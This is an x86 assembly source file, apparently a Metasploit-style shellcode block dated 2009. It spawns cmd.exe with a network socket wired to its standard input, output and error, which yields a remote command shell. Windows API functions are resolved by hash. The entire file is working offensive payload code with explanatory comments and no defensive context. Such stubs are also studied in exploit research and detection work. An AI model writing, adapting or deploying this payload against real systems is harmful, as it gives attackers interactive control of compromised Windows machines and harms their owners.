;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (24 July 2009)
;-----------------------------------------------------------------------------;
[BITS 32]

; Input: EBP must be the address of 'api_call'. EDI must be a socket.
; Output: None.
; Clobbers: EAX, EBX, ECX, ESI, ESP will also be modified

shell:
  push 0x00646D63        ; push our command line: 'cmd',0
  mov ebx, esp           ; save a pointer to the command line
  push edi               ; our socket becomes the shells hStdError
  push edi               ; our socket becomes the shells hStdOutput
  push edi               ; our socket becomes the shells hStdInput
  xor esi, esi           ; Clear ESI for all the NULL's we need to push
  push byte 18           ; We want to place (18 * 4) = 72 null bytes onto the stack
  pop ecx                ; Set ECX for the loop
push_loop:               ;
  push esi               ; push a null dword
  loop push_loop         ; keep looping untill we have pushed enough nulls
  mov word [esp + 60], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  lea eax, [esp + 16]    ; Set EAX as a pointer to our STARTUPINFO Structure
  mov byte [eax], 68     ; Set the size of the STARTUPINFO Structure
  ; perform the call to CreateProcessA
  push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
  push eax               ; Push the pointer to the STARTUPINFO Structure
  push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
  push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
  push esi               ; We dont specify any dwCreationFlags 
  inc esi                ; Increment ESI to be one
  push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
  dec esi                ; Decrement ESI back down to zero
  push esi               ; Set lpThreadAttributes to NULL
  push esi               ; Set lpProcessAttributes to NULL
  push ebx               ; Set the lpCommandLine to point to "cmd",0
  push esi               ; Set lpApplicationName to NULL as we are using the command line param instead
  push 0x863FCC79        ; hash( "kernel32.dll", "CreateProcessA" )
  call ebp               ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
  ; perform the call to WaitForSingleObject
	mov eax, esp           ; save pointer to the PROCESS_INFORMATION Structure 
  dec esi                ; Decrement ESI down to -1 (INFINITE)
  push esi               ; push INFINITE inorder to wait forever
  inc esi                ; Increment ESI back to zero
  push dword [eax]       ; push the handle from our PROCESS_INFORMATION.hProcess
  push 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
  call ebp               ; WaitForSingleObject( pi.hProcess, INFINITE );